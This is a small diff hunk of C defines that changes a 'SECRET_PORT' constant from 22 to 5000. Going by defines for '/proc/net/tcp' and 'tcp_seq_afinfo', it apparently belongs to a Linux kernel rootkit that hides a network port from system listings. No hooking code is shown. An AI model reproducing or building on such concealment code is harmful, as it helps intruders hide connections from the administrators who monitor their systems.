@@ -35,7 +35,7 @@
 
 # define NET_ENTRY "/proc/net/tcp"
 # define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
-# define SECRET_PORT 22
+# define SECRET_PORT 5000
 # define NEEDLE_LEN 6
 # define TMPSZ 150
 
